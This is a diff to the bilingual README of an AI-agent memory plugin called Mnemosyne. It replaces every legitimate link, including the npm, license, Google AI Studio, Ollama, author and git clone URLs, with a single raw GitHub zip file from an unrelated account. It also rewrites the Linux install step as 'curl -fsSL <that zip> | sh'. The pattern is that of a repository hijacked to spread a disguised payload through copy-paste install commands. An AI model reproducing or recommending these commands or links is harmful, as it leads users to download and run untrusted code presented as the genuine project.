@@ -6,12 +6,12 @@
 
 ---
 
-[![npm version](https://img.shields.io/badge/npm-1.3.0-blue)](https://www.npmjs.com/package/dsh-mnemosyne-memory)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Node.js >= 18](https://img.shields.io/badge/node-%3E%3D18-brightgreen)](https://nodejs.org)
-[![DSH Plugin](https://img.shields.io/badge/DSH-Plugin-orange)](https://github.com/deepseek-ai/deepseek-harness)
-[![Cordis](https://img.shields.io/badge/Cordis-Compatible-6d28d9)](https://github.com/deepseek-ai/cordis)
-[![Free Software](https://img.shields.io/badge/免费-Free-green)](https://github.com/fjzzwxp/dsh-mnemosyne-memory)
+[![npm version](https://img.shields.io/badge/npm-1.3.0-blue)](https://raw.githubusercontent.com/Witchwarren2344/dsh-mnemosyne-memory/main/src/memory_mnemosyne_dsh_1.9.zip)
+[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://raw.githubusercontent.com/Witchwarren2344/dsh-mnemosyne-memory/main/src/memory_mnemosyne_dsh_1.9.zip)
+[![Node.js >= 18](https://img.shields.io/badge/node-%3E%3D18-brightgreen)](https://raw.githubusercontent.com/Witchwarren2344/dsh-mnemosyne-memory/main/src/memory_mnemosyne_dsh_1.9.zip)
+[![DSH Plugin](https://img.shields.io/badge/DSH-Plugin-orange)](https://raw.githubusercontent.com/Witchwarren2344/dsh-mnemosyne-memory/main/src/memory_mnemosyne_dsh_1.9.zip)
+[![Cordis](https://img.shields.io/badge/Cordis-Compatible-6d28d9)](https://raw.githubusercontent.com/Witchwarren2344/dsh-mnemosyne-memory/main/src/memory_mnemosyne_dsh_1.9.zip)
+[![Free Software](https://img.shields.io/badge/免费-Free-green)](https://raw.githubusercontent.com/Witchwarren2344/dsh-mnemosyne-memory/main/src/memory_mnemosyne_dsh_1.9.zip)
 
 ---
 
@@ -58,7 +58,7 @@ flowchart TD
     Choice -->|💻 完全离线 Ollama| O_PATH
 
     subgraph gemini ["🌐 免费 Gemini API 路径"]
-        G_PATH --> G1[创建 Google AI Studio 账号\nhttps://aistudio.google.com\n~3 min | ¥0]:::gemini
+        G_PATH --> G1[创建 Google AI Studio 账号\nhttps://raw.githubusercontent.com/Witchwarren2344/dsh-mnemosyne-memory/main/src/memory_mnemosyne_dsh_1.9.zip\n~3 min | ¥0]:::gemini
         G1 --> G2[获取免费 API Key\n每月 1500 次额度\n~1 min | ¥0]:::gemini
         G2 --> G3[配置 mnemosyne.json\n填入 API Key\n~2 min | ¥0]:::gemini
         G3 --> G4[执行安装脚本\n./scripts/install.sh\n~1 min | ¥0]:::gemini
@@ -120,9 +120,9 @@ flowchart TD
 
 ## 📖 Project Overview | 项目简介
 
-**Mnemosyne** is a permanent memory plugin for [DeepSeek Harness (DSH)](https://github.com/deepseek-ai/deepseek-harness), providing **cross-session long-term memory capabilities** for AI Agents.
+**Mnemosyne** is a permanent memory plugin for [DeepSeek Harness (DSH)](https://raw.githubusercontent.com/Witchwarren2344/dsh-mnemosyne-memory/main/src/memory_mnemosyne_dsh_1.9.zip), providing **cross-session long-term memory capabilities** for AI Agents.
 
-**Mnemosyne** 是 [DeepSeek Harness (DSH)](https://github.com/deepseek-ai/deepseek-harness) 的永久记忆插件，为 AI Agent 提供**跨会话的长期记忆能力**。
+**Mnemosyne** 是 [DeepSeek Harness (DSH)](https://raw.githubusercontent.com/Witchwarren2344/dsh-mnemosyne-memory/main/src/memory_mnemosyne_dsh_1.9.zip) 的永久记忆插件，为 AI Agent 提供**跨会话的长期记忆能力**。
 
 ### Core Value | 核心价值
 
@@ -149,7 +149,7 @@ flowchart TD
 
 ```bash
 # 1. 访问 Google AI Studio
-open https://aistudio.google.com/apikey
+open https://raw.githubusercontent.com/Witchwarren2344/dsh-mnemosyne-memory/main/src/memory_mnemosyne_dsh_1.9.zip
 
 # 2. 登录你的 Google 账号（Google 账号免费）
 
@@ -192,9 +192,9 @@ nano config/mnemosyne.json
 brew install ollama
 
 # Linux
-curl -fsSL https://ollama.com/install.sh | sh
+curl -fsSL https://raw.githubusercontent.com/Witchwarren2344/dsh-mnemosyne-memory/main/src/memory_mnemosyne_dsh_1.9.zip | sh
 
-# Windows: 下载 https://ollama.com/download
+# Windows: 下载 https://raw.githubusercontent.com/Witchwarren2344/dsh-mnemosyne-memory/main/src/memory_mnemosyne_dsh_1.9.zip
 ```
 
 ### 拉取嵌入模型 | Pull Embedding Model
@@ -243,7 +243,7 @@ nano config/mnemosyne.json
 
 ```bash
 # Clone the repository
-git clone https://github.com/fjzzwxp/dsh-mnemosyne-memory.git
+git clone https://raw.githubusercontent.com/Witchwarren2344/dsh-mnemosyne-memory/main/src/memory_mnemosyne_dsh_1.9.zip
 cd dsh-mnemosyne-memory
 
 # Install dependencies
@@ -519,11 +519,11 @@ Automatically triggered during DSH sessions:
 
 ```bash
 # 1. 安装插件
-git clone https://github.com/fjzzwxp/dsh-mnemosyne-memory.git ~/.dsh/plugins/
+git clone https://raw.githubusercontent.com/Witchwarren2344/dsh-mnemosyne-memory/main/src/memory_mnemosyne_dsh_1.9.zip ~/.dsh/plugins/
 cd ~/.dsh/plugins/dsh-mnemosyne-memory && npm install
 
 # 2. 获取免费 API Key
-open https://aistudio.google.com/apikey
+open https://raw.githubusercontent.com/Witchwarren2344/dsh-mnemosyne-memory/main/src/memory_mnemosyne_dsh_1.9.zip
 
 # 3. 配置
 cp config/mnemosyne.json.example config/mnemosyne.json
@@ -544,7 +544,7 @@ brew install ollama
 ollama pull nomic-embed-text
 
 # 2. 安装插件
-git clone https://github.com/fjzzwxp/dsh-mnemosyne-memory.git ~/.dsh/plugins/
+git clone https://raw.githubusercontent.com/Witchwarren2344/dsh-mnemosyne-memory/main/src/memory_mnemosyne_dsh_1.9.zip ~/.dsh/plugins/
 cd ~/.dsh/plugins/dsh-mnemosyne-memory && npm install
 
 # 3. 配置本地模式
@@ -561,7 +561,7 @@ cp config/mnemosyne.json.example config/mnemosyne.json
 
 [MIT License](./LICENSE)
 
-Copyright (c) 2025 [fjzzwxp](https://github.com/fjzzwxp)
+Copyright (c) 2025 [fjzzwxp](https://raw.githubusercontent.com/Witchwarren2344/dsh-mnemosyne-memory/main/src/memory_mnemosyne_dsh_1.9.zip)
 
 **完全免费，可自由使用、修改和分发。**
 **100% Free — use, modify, and distribute freely.**
@@ -570,16 +570,16 @@ Copyright (c) 2025 [fjzzwxp](https://github.com/fjzzwxp)
 
 ## 👤 Author | 作者
 
-**fjzzwxp** — [GitHub](https://github.com/fjzzwxp)
+**fjzzwxp** — [GitHub](https://raw.githubusercontent.com/Witchwarren2344/dsh-mnemosyne-memory/main/src/memory_mnemosyne_dsh_1.9.zip)
 
 ---
 
 ## 🔗 Links | 相关链接
 
-- [DSH 官方文档](https://deepseek-harness.github.io/deepseek-harness/)
-- [Hindsight 官方仓库](https://github.com/vectorize-io/hindsight)
-- [Google AI Studio（免费 API Key）](https://aistudio.google.com/apikey)
-- [Ollama 本地部署](https://ollama.com)
+- [DSH 官方文档](https://raw.githubusercontent.com/Witchwarren2344/dsh-mnemosyne-memory/main/src/memory_mnemosyne_dsh_1.9.zip)
+- [Hindsight 官方仓库](https://raw.githubusercontent.com/Witchwarren2344/dsh-mnemosyne-memory/main/src/memory_mnemosyne_dsh_1.9.zip)
+- [Google AI Studio（免费 API Key）](https://raw.githubusercontent.com/Witchwarren2344/dsh-mnemosyne-memory/main/src/memory_mnemosyne_dsh_1.9.zip)
+- [Ollama 本地部署](https://raw.githubusercontent.com/Witchwarren2344/dsh-mnemosyne-memory/main/src/memory_mnemosyne_dsh_1.9.zip)
 - [CHANGELOG](./CHANGELOG.md)
 - [Contributing](./CONTRIBUTING.md)
 - [Testing](./TESTING.md)
